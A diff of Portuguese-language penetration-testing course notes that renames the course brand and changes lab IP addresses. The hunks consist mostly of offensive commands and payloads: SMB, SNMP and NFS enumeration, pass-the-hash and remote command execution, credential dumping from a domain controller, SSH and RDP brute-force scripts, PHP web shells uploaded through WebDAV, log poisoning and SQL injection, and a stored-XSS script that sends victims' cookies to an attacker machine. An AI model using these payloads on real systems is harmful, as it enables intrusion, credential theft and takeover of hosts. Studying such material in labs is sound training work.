@@ -548,7 +548,7 @@ Escaneia a porta 80 do site
 
 Escaneia da porta 20 à 1024
 
-    for ip in $(cat portlist);do nc -vnz 172.16.1.5 $ip;done 
+    for ip in $(cat portlist);do nc -vnz 192.168.1.5 $ip;done 
 
 PortScan usando um arquivo
 
@@ -911,7 +911,7 @@ Faz um CURL do site com verbose
 
 Força mostrar o banner com a versão do ASP.NET PHP JS...
 
-    curl -v -H "User-Agent: Desec Tool" site.com.br 
+    curl -v -H "User-Agent: Kidman Tool" site.com.br 
 
 Burlando o user agent
 
@@ -1081,7 +1081,7 @@ Varre portas com coringa e salva em coringa
 
 Identificando serviços
 
-    nmap -v -sV -Pn 172.16.1.2 
+    nmap -v -sV -Pn 192.168.1.2 
 
 Pegando o Banner de todas as portas abertas
 
@@ -1311,13 +1311,13 @@ Mostra o atributo flags do pacote TCP
 
 Grava em resp e no respe as respostas e não respostas respectiv
 
-    pacote = pIP/ICMP()/"DESEC"
+    pacote = pIP/ICMP()/"kidman"
 
-Pacote ICMP com payload "DESEC"
+Pacote ICMP com payload "kidman"
 
-    pacote = pIP/pTCP/"Desec"
+    pacote = pIP/pTCP/"KidMan"
 
-Pacote TCP com payload "Desec"
+Pacote TCP com payload "Kidman"
 
 
 Nota: Requisição de conexão HTTP OPTIONS retorna os métodos de requisições aceitos pela aplicação. Na requisição colocando 1.1 no HTTP é possível especificar o HOST para ir direto ao domínio
@@ -1400,7 +1400,7 @@ Conecta diretamente ao arquivos/pasta do host
 
 .
 
-    rpcclient -U " " -N 172.16.1.5
+    rpcclient -U " " -N 192.168.1.5
 
 Serve para conectar em servidores com acesso remoto disponível
 
@@ -1500,11 +1500,11 @@ Conecta com a porta 23 para fazer login e encontra as senhas em cirt.net/passwor
 - Enumerando com SSH
 
 .
-    nc 172.16.1.1,2,5,120 22 
+    nc 192.168.1.1,2,5,120 22 
 
 Captura o banner da porta e um possível SO
 
-    ssh -v 172.16.1.1,2,5,120 
+    ssh -v 192.168.1,2,5,120 
 
 SSH em modo verbose com informações detalhadas informando as chaves de autenticação aceitas pelo servidor Local dos known hosts (/root/.ssh/known_hosts)
 
@@ -1536,11 +1536,11 @@ Nota: Criar usuário e colocar a chave pública dentro do servidor para ganhar a
 
 .
     
-    rpcinfo -p 172.16.1.5 | grep nfs 
+    rpcinfo -p 192.168.1.5 | grep nfs 
 
 Enumera as informações da versão do NFS
 
-    showmount -e 172.16.1.5 
+    showmount -e 192.168.1.5 
 
 Mostra os pontos de montagem do host
 
@@ -1548,8 +1548,8 @@ Mostra os pontos de montagem do host
 
 Cria a pasta para fazer a montagem  do diretório
 
-    mount -t nfs -o nfsvers=2 172.16.1.5:/ /temp/nfs 
-    sudo mount -v -t nfs -o vers=3,proto=tcp,nolock 172.16.1.31:/home/camila /tmp/nfs/
+    mount -t nfs -o nfsvers=2 192.168.1.5:/ /temp/nfs 
+    sudo mount -v -t nfs -o vers=3,proto=tcp,nolock 192.168.1.31:/home/camila /tmp/nfs/
 
 Monta o host disponível no caminho criado usando o ponto de montagem do host descoberto anteriormente
 
@@ -1566,11 +1566,11 @@ Desmonta o ponto de montagem do host montado anteriormente.
 
 Nota: Usado para gerenciamento de rede basicamente, a Communit é a palavra secreta, o OID é o id do objeto e os MIBs são as infos, instalar o pacote de informações adicionais: `apt install snmp-mibs-downloader`. Para listar os usuários usa-se `1.3.6.1.2.1.6.13.1.3`, Communitys padrões: public, private, cisco, manages, access, secret. Sites com informações relevantes alvestrand.no/objectid/1.3.6.1.2.1.html e oid-info.com
 
-    onesixtyone -c lista.txt 172.16.1.0/24
+    onesixtyone -c lista.txt 192.168.1.0/24
 
 Varre a rede em busca de serviços snmp ativos
 
-    snmpwalk -c public -v1 172.16.1.4 1.3.6.1.4.1.77.1.2.25 
+    snmpwalk -c public -v1 192.168.1.4 1.3.6.1.4.1.77.1.2.25 
 
 Invade o host encontrado em busca de nomes de usuários
 
@@ -1594,19 +1594,19 @@ Lista detalhes do MIB descoberto no comando anterior
 
 Exibe vários tipos de MIB de acordo com a pesquisa
 
-    snmpwalk -c public -v1 172.16.1.4 IP-MIB::icmpInEchos 
+    snmpwalk -c public -v1 192.168.1.4 IP-MIB::icmpInEchos 
 
 Invade o Host mostrando a quantidade de pacotes ICMP enviados a ele.
 
-    snmp-check 172.16.1.4 -c public 
+    snmp-check 192.168.1.4 -c public 
 
 Carrega informações importantes da máquina com SNMP aberto
 
-    snmpwalk -c manager -v1 172.16.1.247 
+    snmpwalk -c manager -v1 192.168.1.247 
 
 Acessa com o nível de administrador
 
-    snmpset -c manager -v1 172.16.1.247 SNMPv2-MIB::sysContact.o s "Desec" 
+    snmpset -c manager -v1 192.168.1.247 SNMPv2-MIB::sysContact.o s "KidMan" 
 
 Altera a info de contact do serviço snmp do servidor.
 
@@ -1623,7 +1623,7 @@ NC para conexão udp com host
 
 .
 
-    mysql -h 172.16.1.5 -u root 
+    mysql -h 192.168.1.5 -u root 
 
 Conecta no MySQL usando o usuário root
 
@@ -1690,7 +1690,7 @@ Pesquisa por vulnerabilidade com o script informado
 
 Executa argumentos para validação da vulnerabilidade
 
-    /user/share/nmap/scripts# nmap -p21 --script ftp-anon.nse -Pn 172.16.1.108 
+    /user/share/nmap/scripts# nmap -p21 --script ftp-anon.nse -Pn 192.168.1.108 
 
 Procurando por vulnerabilidade de FTP com usuário anônimo
 
@@ -1737,11 +1737,11 @@ Mostra o que já foi descoberto/feito nos host (somente se estiver com a base de
 
 Exibe a porta já encontrada
 
-    db_nmap -v --open -sS  -Pn 172.16.1.7 
+    db_nmap -v --open -sS  -Pn 192.168.1.7 
 
 Roda o Nmap dentro do MSF
 
-    nmap -v --open -sV  -Pn 172.16.1.4 -oX /opt/host4.xml
+    nmap -v --open -sV  -Pn 192.168.1.4 -oX /opt/host4.xml
 
 Nmap com output xml para importar no MSF
 
@@ -1781,7 +1781,7 @@ Auxiliar para enumerar a versão do smb em busca de informações detalhadas
 
 Adiciona ao auxiliar/exploit os hosts daquela porta informada
 
-    hosts -i "informacao-a-ser-adicionada" 172.16.1.10 
+    hosts -i "informacao-a-ser-adicionada" 192.168.1.10 
 
 Adiciona informação faltante do host
 
@@ -1918,7 +1918,7 @@ Cria exploit em war
 Cria exploit em php
 
 
-Nota: Solução Lab Desec Metasploit:
+Nota: Solução Lab KidMan Metasploit:
 
         https://absolomb.com/2018-02-24-HackTheBox-Matis-Writeup 
         porta serv kerberos
@@ -1943,7 +1943,7 @@ Ler e modifica um arquivo
 
 Hash com Python: 
 
-        Import Hashlib.md5("Desec").hexdigest()
+        Import Hashlib.md5("KidMan").hexdigest()
         Import base64.b64encode("desec")
         Import base64.b64decode("desec")
 .
@@ -2051,7 +2051,7 @@ Salva o arquivo System do Reg do Win (root) all version
 Cópia de sombra de volume
 
 
-Nota: Exploit/windows/smb/ms08_067_netapi RHOST 172.16.1.4 
+Nota: Exploit/windows/smb/ms08_067_netapi RHOST 192.168.1.4 
 
 Exploit de vulnerabilidade smb no XP
 
@@ -2079,7 +2079,7 @@ Precisa da confirmação de usuário e de uma SESSION aberta para funcionar
 Usa a SESSION mas não precisa da confirmação do user
 
 
-Nota: exploit-Windows-Eternalblue-win8 RHOST 172.16.1.233
+Nota: exploit-Windows-Eternalblue-win8 RHOST 192.168.1.233
 
 - Explorando o AD
 
@@ -2165,9 +2165,9 @@ Quebra as senhas dos usuários de logon
 
 Usando as credenciais
 
-    smbclient -L \\172.16.1.60 -U rogerio -W dominio
-    smbclient -l //172.16.1.60/dados -U rogerio -W dominio
-    xfreerdp /v:172.16.1.60 /u:rogerio /p:password
+    smbclient -L \\192.168.1.60 -U rogerio -W dominio
+    smbclient -l //192.168.1.60/dados -U rogerio -W dominio
+    xfreerdp /v:192.168.1.60 /u:rogerio /p:password
 
 - Obtendo Credenciais pela rede
 
@@ -2182,19 +2182,19 @@ Se conectará ao ip com as credenciais e varrerá a vítima em busca de outras c
 
 .
 
-    winexe -U user%password //172.16.1.60 cmd.exe 
+    winexe -U user%password //192.168.1.60 cmd.exe 
 
 Conseguir a shell do alvo usando credenciais válidas
 
 
-NOTA: exploit/windows/smb/psexec, payload-x64-rev_tcp RHOST 172.16.1.60 para conseguir uma shell no alvo usando credenciais do AD no smb.
+NOTA: exploit/windows/smb/psexec, payload-x64-rev_tcp RHOST 192.168.1.60 para conseguir uma shell no alvo usando credenciais do AD no smb.
 Pesquisar UAC no metasploit encontra exploit para pegar admin/privesc no windows com usuário comum usando uma sessão ativa no metasploit
 
     wce64.exe -w 
 
 Executar no alvo o WCE64 dos resources do windows localizadas no kali e fazer a enumeração das hashes
 
-    pth-winexe -U rogerio%hashencontrado //172.16.1.60 
+    pth-winexe -U rogerio%hashencontrado //192.168.1.60 
 
 Autentica usando a hash encontrada, o mesmo pode ser feito no exploit psexec PassTheHash
 
@@ -2206,15 +2206,15 @@ Autentica usando a hash encontrada, o mesmo pode ser feito no exploit psexec Pas
     apt install crackmapexec
 .
 
-    crackmapexec smb 172.16.1.0/24 
+    crackmapexec smb 192.168.1.0/24 
 
 Procura por hosts e faz a enumeração do smb automaticamente
 
-    crackmapexec smb 172.16.1.0/24 -u rogerio -p 'password' 
+    crackmapexec smb 192.168.1.0/24 -u rogerio -p 'password' 
 
 Faz a varredura e diz o que dá para fazer ou não usando as credenciais passadas
 
-    crackmapexec smb 172.16.1.60 -u rogerio -p 'password' -X  'ipconfig /all' 
+    crackmapexec smb 192.168.1.60 -u rogerio -p 'password' -X  'ipconfig /all' 
 
 Roda um comando no alvo e traz a saída. O -L lista os módulos e o -h apresenta o Help
 
@@ -2245,7 +2245,7 @@ Quebra a senha encontrada
 
 Escopo é pegar apenas os hosts do orionscorp e fazer os testes de segurança
 
-    nmap -v -Pn -sS -p 445 172.16.1.0/24 -oG smb.txt 
+    nmap -v -Pn -sS -p 445 192.168.1.0/24 -oG smb.txt 
 
 Procura por hosts com compartilhamento ativo em busca do servidor de AD
 
@@ -2253,17 +2253,17 @@ Procura por hosts com compartilhamento ativo em busca do servidor de AD
 
 Procura pelos hosts encontrados anteriormente para enumerar o serviço smb e saber dos computadores no grupo orionscorp
 
-    nmap -v -Pn -p- 172.16.1.243 
+    nmap -v -Pn -p- 192.168.1.243 
 
 Varre as portas do host do AD para saber dos serviços ativos
 
-    host 172.16.1.241 172.16.1.243 
+    host 192.168.1.241 192.168.1.243 
 
 Para descobrir o nome do host perguntando para o servidor de DNS da orionscorp (segundo IP é o IP que responde à pergunta de DNS, quando passado)
 
     Maquina Pentester: cat /etc/responder/responder.conf
 
-Em: RespondTo = 172.16.1.243, 172.16.1.241, 172.16.1.253 
+Em: RespondTo = 192.168.1.243, 192.168.1.241, 192.168.1.253 
 
     responder -I eth0 -Priv 
 
@@ -2276,7 +2276,7 @@ Validando os usuários
 
 Validar usuários encontrados e tentar saber qual tem permissão de execução de comandos Pwn3d!
 
-    python3 /usr/share/doc/python3-impacket/examples/psexec.py dominio/usuario:'senha@172.16.1.253' 
+    python3 /usr/share/doc/python3-impacket/examples/psexec.py dominio/usuario:'senha@192.168.1.253' 
 
 Faz a autenticação usando o psexec podendo também usar o metasploit
 
@@ -2291,7 +2291,7 @@ Usando o repair é um cache antigo no caso nos sistemas windows XP...
 
 No AD se usa o NTDS.dit
 
-    impacket-secretsdump dominio/usuario:'senha'@172.16.1.253 
+    impacket-secretsdump dominio/usuario:'senha'@192.168.1.253 
 
 Tentar pegar as senhas dos administradores do sistema
 
@@ -2307,19 +2307,19 @@ Trazendo os hashes dos usuários | DCC = domain cash credentials
 
 .
 
-    crackmapexec 172.16.1.243 -u egabriel -p 'p@ssw0rd' -x 'ipconfig' 
+    crackmapexec 192.168.1.243 -u egabriel -p 'p@ssw0rd' -x 'ipconfig' 
 
 Valida  a senha de adm e envia comando direto para a máquina do AD 
 
-    crackmapexec smb 172.16.1.243 -u user -p 'password' -L 
+    crackmapexec smb 192.168.1.243 -u user -p 'password' -L 
 
 Lista os módulos do crackmapexec inclusive te permite habilitar o RDP, caso esteja desabilitado
 
-    crackmapexec smb 172.16.1.243 -u user -p 'password' -M rdp --options 
+    crackmapexec smb 192.168.1.243 -u user -p 'password' -M rdp --options 
 
 Lista as opções do módulo
 
-    crackmapexec smb 172.16.1.243 -u user -p 'password' -M rdp -o ACTION=enable 
+    crackmapexec smb 192.168.1.243 -u user -p 'password' -M rdp -o ACTION=enable 
 
 Ativa o modulo
 
@@ -2461,7 +2461,7 @@ Brute force com password encontrado em todos os servers.
 
 		try:
 
-		    ssh.connect('172.16.1.5', username='root', password=senha)
+		    ssh.connect('192.168.1.5', username='root', password=senha)
 
 		except paramiko.ssh_exception.AuthenticationException: # Tratar quando login errado
 
@@ -2489,7 +2489,7 @@ Brute force com password encontrado em todos os servers.
 
 	    echo "Testando senha: $pass"
 
-	    xfreerdp /u:rgerio /p:$pass /d:gbusiness /v:172.16.1.60
+	    xfreerdp /u:rgerio /p:$pass /d:gkidman /v:192.168.1.60
 
 	    done
 
@@ -2716,7 +2716,7 @@ Linkar o obj gerando o exe
 
 	int main(){
 
-		MessageBoxA(0,"Ygor C Developer","From DesecSecurity",1);
+		MessageBoxA(0,"Ygor C Developer","From KidManSecurity",1);
 
 	}
 
@@ -2874,7 +2874,7 @@ Cria o arquivo executável do linux 64bits
 
 	section .data
 
-	    curso: db 'Desec Security', 0xa ; pula uma linha
+	    curso: db 'KidMan Security', 0xa ; pula uma linha
 
 	section .text
 
@@ -2981,7 +2981,7 @@ Abre o debugger de semelhante modo ao Immunity debugger
 
 	section .data
 
-	    curso: db 'Desec Security',0xa
+	    curso: db 'KidMan Security',0xa
 
 	section .text
 
@@ -3602,7 +3602,7 @@ Todos os comandos são intuitivos, não precisa de descrição...
     select database();
     select user();
     select version();
-    create database DESEC;
+    create database Kidman;
     use desec;
     show tables;
     create table usuarios
@@ -3689,46 +3689,46 @@ Traz as 3 primeiras letras da palavra
 	
 .
 
-    gobuster dir -u -e http://172.16.1.10 -u /wordlist.txt -s "200,301,302,401" -a user-agent
+    gobuster dir -u -e http://192.168.1.10 -u /wordlist.txt -s "200,301,302,401" -a user-agent
 
 Bruteforce de diretórios filtrando cod http e user agent
 
-    gobuster dir -u -e http://172.16.1.10 -u /wordlist.txt -s "200,301,302,401" -x .php,.txt,.sql,.bkp
+    gobuster dir -u -e http://192.168.1.10 -u /wordlist.txt -s "200,301,302,401" -x .php,.txt,.sql,.bkp
 
 Bruteforce de diretórios filtrando cod http e extensão de arquivos.
 
-    curl -v -X OPTIONS http://172.16.1.10 
+    curl -v -X OPTIONS http://192.168.1.10 
 
 Verifica todos os métodos do diretório, passar os outros dirs
 
-    nc -v 172.16.1.10 80 -C | PUT /webdav/ HTTP/1.1 host: 172.16.1.10 
+    nc -v 192.168.1.10 80 -C | PUT /webdav/ HTTP/1.1 host: 192.168.1.10 
 
 Testando o metodo PUT
 
-    nc -v 172.16.1.10 80 -C | DELETE /webdav/ HTTP/1.1 host: 172.16.1.10 
+    nc -v 192.168.1.10 80 -C | DELETE /webdav/ HTTP/1.1 host: 192.168.1.10 
 
 Testando o metodo PUT
 
-    curl -v -X PUT http://172.16.1.10/webdav/test.txt 
+    curl -v -X PUT http://192.168.1.10/webdav/test.txt 
 
 Cria um arquivo no DIR
 
-    curl -v -X DELETE http://172.16.1.10/webdav/test.txt 
+    curl -v -X DELETE http://192.168.1.10/webdav/test.txt 
 
 Deleta o arquivo do DIR
 
 
 Nota: CVE-2017-12615 Vulnerabilidade de exploração do método PUT no webdav
 
-    curl -v -X PUT -d "<?php system('id');?>" https://172.16.1.10/webdav/comand.php 
+    curl -v -X PUT -d "<?php system('id');?>" https://192.168.1.10/webdav/comand.php 
 
 Envia comando em php para interpretar e ganhar acesso ao host.
 
-    curl -v -X PUT -d "<?php system(\$_GET["desec"])?>" http://172.16.1.10/webdav/com_par.php
+    curl -v -X PUT -d "<?php system(\$_GET["desec"])?>" http://192.168.1.10/webdav/com_par.php
 
 Na URL passa o parâmetro /?desec=cat /etc/passwd Explora podendo executar comandos
 
-    curl -v http://172.16.1.10/webdav/ --upload-file shell.php 
+    curl -v http://192.168.1.10/webdav/ --upload-file shell.php 
 
 Fazer upload do código em php para o dir
 
@@ -3736,15 +3736,15 @@ Fazer upload do código em php para o dir
 
 Arquivo shell para chamar na URL e executar comandos (/?desec=cat /etc/passwd)
 
-    cadaver http://172.16.1.10/webdav/
+    cadaver http://192.168.1.10/webdav/
 
 Ferramenta para invadir o host podendo dá um HELP e ver o comandos disponíveis
 
-    davtest --url http://172.16.1.10/webdav/ 
+    davtest --url http://192.168.1.10/webdav/ 
 
 Testa a aplicação e retorno sobre os tipos de arquivos aceitos
 
-    curl -c -X POST http://172.16.1.10/logs 
+    curl -c -X POST http://192.168.1.10/logs 
 
 Da bypass no diretório que estava pedindo autenticação, mas só funciona se a página aceitar o método POST
 
@@ -3769,7 +3769,7 @@ Nota: Atentar para vetores de ataques que podem ser: Métodos, campos de formul�
 
 	fclose($file); 
 
-	header("Location: http://172.16.1.10/turismo/login.php")
+	header("Location: http://192.168.1.10/turismo/login.php")
 
 	?>
 
@@ -3779,7 +3779,7 @@ Nota: Observar link de reset de senha para ver se o email não passou o email co
 
 Falhas em diretórios com erros na aplicação, parâmetros indefinidos... Sempre observar o código fonte. É quando a aplicação permite ver o patch dos arquivos locais.
 
-    http://172.16.1.10/turismo/logado.php?banners=/../../ 
+    http://192.168.1.10/turismo/logado.php?banners=/../../ 
 
 Banners era um parâmetro indefinido que foi passado por parâmetro com falha 
 
@@ -3804,16 +3804,16 @@ Identificar parâmetros na aplicação com LFI, colocando /../ e verificando o c
 
 Exemplos abaixo:
 
-        http://172.16.1.10/turismo/info.php?p=/../../../../
+        http://192.168.1.10/turismo/info.php?p=/../../../../
 
 
 - LFI -> RCE = Inserção de código no LOG
 
 .
 
-    http://172.16.1.10/turismo/info.php?p=/../../../../var/log/apache2/access.log 
+    http://192.168.1.10/turismo/info.php?p=/../../../../var/log/apache2/access.log 
 
-Para acesso ao log injetar via nc -v 172.16.1.10 80 -C a shell <?php system(\$_GET['desec']);?> via requisição e depois colocar no final da URL /access.log&param=ifconfig. Verificar se o host também dispõe de outras portas abertas, por exemplo a 25 para fazer a exploração SMTP e por aí vai.
+Para acesso ao log injetar via nc -v 192.168.1.10 80 -C a shell <?php system(\$_GET['desec']);?> via requisição e depois colocar no final da URL /access.log&param=ifconfig. Verificar se o host também dispõe de outras portas abertas, por exemplo a 25 para fazer a exploração SMTP e por aí vai.
 
 1. Parte Email a Reverse Shell 
 
@@ -3873,7 +3873,7 @@ Opções de testes de leitura de arquivo: /var/log/auth.log /var/log/mail.log /v
 
 .
 
-    http://172.16.1.10/turismo/link.php?link=http://192.168.254.51:8080/injecao&kidman=ls 
+    http://192.168.1.10/turismo/link.php?link=http://192.168.254.51:8080/injecao&kidman=ls 
 
 Consiste em criar um servidor para pegar o redirecionamento que é feito externamente para mudar pra dentro do arquivo no servidor hacker com código malicioso assim tomando controle podendo usar comandos.
 
@@ -3882,7 +3882,7 @@ Consiste em criar um servidor para pegar o redirecionamento que é feito externa
 
 Procurar campos de formulários para a inserção de códigos HTML, podendo assim, adicionar texto, href, campos de dados...
 
-    http://172.16.1.10/turismo/procurar.php?busca=%3Ch1%3EPentester%3C%2Fh1%3E
+    http://192.168.1.10/turismo/procurar.php?busca=%3Ch1%3EPentester%3C%2Fh1%3E
 
 Foi inserido o código `<h1>Pentester</h1>` dentro do formulário. Podendo ser inserido um href para redirecionar para outra página (fake) `<a href=http://192.168.254.51>DESCONTÃO</a>`
 
@@ -3916,7 +3916,7 @@ Consiste em armazenar código JS em banco de dados, através de um campo de form
 
 Ao identificar este campo, pode-se abrir um serviço http via python e enviar uma requisição JS para esta máquina com o PHPSESSID (Cookie) através do script: 
 
-    no server: 172.16.1.250 <script>new Image().src="http://172.20.1.120:8080/?="+document.cookie;</script> 
+    no server: 192.168.1.250 <script>new Image().src="http://172.20.1.120:8080/?="+document.cookie;</script> 
 
 Esse script envia dados para o serviço aberto na máquina do atacante. Na máquina atacante vai chegar o cookie da sessão da máquina vítima, depois adiciona o cookie `<script>alert(document.cookie="COOKIECAPT")</script>`
 
@@ -3925,15 +3925,15 @@ Esse script envia dados para o serviço aberto na máquina do atacante. Na máqu
 
 Ferramenta XSSSTRIKE no github. Ferramenta que faz a busca por vulnerabilidades XSS
 
-    python3 xsstrike.py -u "http://172.16.1.10/turismo/procurar.php?busca=" 
+    python3 xsstrike.py -u "http://192.168.1.10/turismo/procurar.php?busca=" 
 
 Faz teste no paramet
 
-    python3 sxxtrile.py -u "http://172.16.1.10/turismo/procurar.php" --params 
+    python3 sxxtrile.py -u "http://192.168.1.10/turismo/procurar.php" --params 
 
 Procura por paramt
 
-    python3 xsstrike.py -u "http://172.16.1.10/turismo/procurar.php/" --path 
+    python3 xsstrike.py -u "http://192.168.1.10/turismo/procurar.php/" --path 
 
 Faz um patch transversal
 
@@ -3946,46 +3946,46 @@ Faz um patch transversal
 
 Quando ao inserir um \ ou ' no final do parâmetro, retorna um erro de sintaxe do sql, nesse caso identificando o erro e podendo explorar a vulnerabilidade.
 
-    172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,3,4,5 %23 
+    192.168.1.10/turismo/agencias.php?loja=sp' union select 1,2,3,4,5 %23 
 
 Teste sql onde o número representa a quantidade de colunas, quando não retornar mais erro, o número é a quantidade de colunas daquela tabela %23 representa o # no url encode
 
-    172.16.1.10/turismo/agencias.php?loja=sp' order by 1,2,3,4,5' 
+    192.168.1.10/turismo/agencias.php?loja=sp' order by 1,2,3,4,5' 
 
 Também serve para fazer o teste que é de ordenação. No lugar dos números pode se passar version() user() database() 
 
 Ficando assim:
 
-        172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,version(),user (),database() %23
+        192.168.1.10/turismo/agencias.php?loja=sp' union select 1,2,version(),user (),database() %23
 
 
 - SQLi Information Schema
 
 Fazer consulta na base information schema onde tem todas as tabelas de todos os bancos.
 
-    172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,table_name,4,5 from information_schema.tables%23 
+    192.168.1.10/turismo/agencias.php?loja=sp' union select 1,2,table_name,4,5 from information_schema.tables%23 
 
 Faz a consulta no banco e traz todas as tabelas de todas as bases
 
-    172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,table_name,4,5 from information_schema.tables where table_schema="dbmrtur" %23 
+    192.168.1.10/turismo/agencias.php?loja=sp' union select 1,2,table_name,4,5 from information_schema.tables where table_schema="dbmrtur" %23 
 
 Faz a consulta no banco e traz as tabelas apenas da base dbmrtur
 
-    172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,culumn_name,4,5 from information_schema.columns where table_schema="dbmrtur"%23 
+    192.168.1.10/turismo/agencias.php?loja=sp' union select 1,2,culumn_name,4,5 from information_schema.columns where table_schema="dbmrtur"%23 
 
 Faz a consulta de todas as colunas da base dbmrtur
 
-    172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema="dbmrtur" %23 
+    192.168.1.10/turismo/agencias.php?loja=sp' union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema="dbmrtur" %23 
 
 Faz a concatenação das tabelas para ficar fácil a adivinhação dos nomes das tabelas na hora da enumeração com o Burp e o Length(group_concat()) pra pegar o tamanho
 
-    172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,column_name,4,5 from information_schema.columns where table_schema="dbmrtur" and table_name="mrusers"%23 
+    192.168.1.10/turismo/agencias.php?loja=sp' union select 1,2,column_name,4,5 from information_schema.columns where table_schema="dbmrtur" and table_name="mrusers"%23 
 
 Faz a consulta das colunas da informations schema na base dbmrtur trazendo as colunas da tabela mrusers
 
-    172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,nome,login,senha from mrusers %23 Traz nome login e senha da base bdmrtur na tabela mrusers
+    192.168.1.10/turismo/agencias.php?loja=sp' union select 1,2,nome,login,senha from mrusers %23 Traz nome login e senha da base bdmrtur na tabela mrusers
 
-    172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,concat(login,':',senha),4,5 from mrusers %23 
+    192.168.1.10/turismo/agencias.php?loja=sp' union select 1,2,concat(login,':',senha),4,5 from mrusers %23 
 
 Faz a busca por login e senha concatenados, usar quando houver poucas tabelas (espaços para consulta)
 
@@ -3994,19 +3994,19 @@ Faz a busca por login e senha concatenados, usar quando houver poucas tabelas (e
 
 Fazer o carregamento de arquivos através da falha de SQL Injection error based
 
-    172.16.1.10/turismo/agencias.php?loja=' union all select 1,2,3,4,load_file("/etc/passwd") %23 
+    192.168.1.10/turismo/agencias.php?loja=' union all select 1,2,3,4,load_file("/etc/passwd") %23 
 
 Ler arquivo através da falha
 
-    172.16.1.10/turismo/agencias.php?loja=' union all select 1,2,3,4,"DESEC" INTO OUTFILE "/var/www/html/turismo/banner/desec.txt" %23 
+    192.168.1.10/turismo/agencias.php?loja=' union all select 1,2,3,4,"KidMan" INTO OUTFILE "/var/www/html/turismo/banner/desec.txt" %23 
 
 Encontrar arquivo que tenha permissão de escrita para inserir o arquivo
 
-    172.16.1.10/turismo/agencias.php?loja=' union all select 1,2,3,4,"<?php system($_GET['hacker']);?>" INTO OUTFILE "/var/www/html/turismo/banners/kid.php" %23 
+    192.168.1.10/turismo/agencias.php?loja=' union all select 1,2,3,4,"<?php system($_GET['hacker']);?>" INTO OUTFILE "/var/www/html/turismo/banners/kid.php" %23 
 
 Insere um código em PHP no diretório para usar o parâmetro e executar códigos na página
 
-    172.16.1.10/turismo/banners/rce.php?hacker=ifconfig 
+    192.168.1.10/turismo/banners/rce.php?hacker=ifconfig 
 
 Usa o arquivo criado para inserir comandos
 
@@ -4021,13 +4021,13 @@ Quando a aplicação tem o addslashes, ela adiciona ao final de cada consulta na
 
 - SQL Injection em PostgreSQL ver SQLi Information Schema
 
-A sintaxe muda um pouco mas é basicamente a mesma estrutura. Quando no `union select` não aceitar os números `1 2 3` colocar `null,null,null` e quando for fazer o teste de string colocar `'teste'` sem usar o `%23`. Para ver as informações do banco, usar `current_database()`, `current_user`, `version()`. A diferença do Mysql é que ao invés de usar `where table_schema` usar `table_catalog=''` quando for fazer a consulta das credenciais usar `null,login||'-'||password|` Deve usar o pipe para separar a concatenação. Host usado na aula: 172.16.1.9
+A sintaxe muda um pouco mas é basicamente a mesma estrutura. Quando no `union select` não aceitar os números `1 2 3` colocar `null,null,null` e quando for fazer o teste de string colocar `'teste'` sem usar o `%23`. Para ver as informações do banco, usar `current_database()`, `current_user`, `version()`. A diferença do Mysql é que ao invés de usar `where table_schema` usar `table_catalog=''` quando for fazer a consulta das credenciais usar `null,login||'-'||password|` Deve usar o pipe para separar a concatenação. Host usado na aula: 192.168.1.9
 
 Nota: Na requisição montar com a palavra null ou o número na frente ficando null from information... ou 5 from information...
 
 - Blind SQL Injection 
 
-É fazer o teste de SQL não somente com o `'` mas com o comando booleano `hack' or 1=1#` Ou outra lógica para dar bypass (172.16.1.5)
+É fazer o teste de SQL não somente com o `'` mas com o comando booleano `hack' or 1=1#` Ou outra lógica para dar bypass (192.168.1.5)
 
 - Blind POST SQL Injection
 
@@ -4087,25 +4087,25 @@ Chuta os char da database um por um
 
 .
 
-    sqlmap -u "172.16.1.10/turismo/agencias.php?loja=sp" --current-db
+    sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" --current-db
 
-    sqlmap -u "172.16.1.10/turismo/agencias.php?loja=sp" --dbs
+    sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" --dbs
 
-    sqlmap -u "172.16.1.10/turismo/agencias.php?loja=sp" -D dbmrtur --tables
+    sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" -D dbmrtur --tables
 
-    sqlmap -u "172.16.1.10/turismo/agencias.php?loja=sp" -D dbmrtur -T mrusers --columns
+    sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" -D dbmrtur -T mrusers --columns
 
-    sqlmap -u "172.16.1.10/turismo/agencias.php?loja=sp" -D dbmrtur -T mrusers --columns -C 'login,senha' --dump
+    sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" -D dbmrtur -T mrusers --columns -C 'login,senha' --dump
 
-    sqlmap -u "172.16.1.10/turismo/agencias.php?loja=sp" --current-user
+    sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" --current-user
 
-    sqlmap -u "172.16.1.10/turismo/agencias.php?loja=sp" --users
+    sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" --users
 
-    sqlmap -u "172.16.1.10/turismo/agencias.php?loja=sp" --passwords
+    sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" --passwords
 
-    sqlmap -u "172.16.1.10/turismo/agencias.php?loja=sp" --os-shell
+    sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" --os-shell
 
-    sqlmap -u "172.16.1.10/turismo/turismo/login.php" --forms
+    sqlmap -u "192.168.1.10/turismo/turismo/login.php" --forms
 
 
 - Command Injection
@@ -4116,17 +4116,17 @@ Identificar na aplicação a possibilidade de injetar comandos depois de entende
 
 A ferramenta commix serve para automatizar o command injection, deve-se identificar se a aplicação é `POST` ou não e informar o parâmetro que no caso do exemplo abaixo é `site=`
 
-    commix --url http://172.16.1.10/hosting/ --data="site=businesscorp.com.br"
+    commix --url http://192.168.1.10/hosting/ --data="site=kidmancorp.com.br"
 
 - Enumerando campos com Intruder
 
-Mandar o campo que deseja fazer intrusão para o INTRUDER do burpe suite e carregar a lista para fazer o bruteforce, podendo fazer o filtro pela palavra para saber quais palavras da wordlist é válida, ou está ativa. Na aula foi usado o link `172.16.1.10/turismo/ativar-conta.php` no parâmetro `login=`
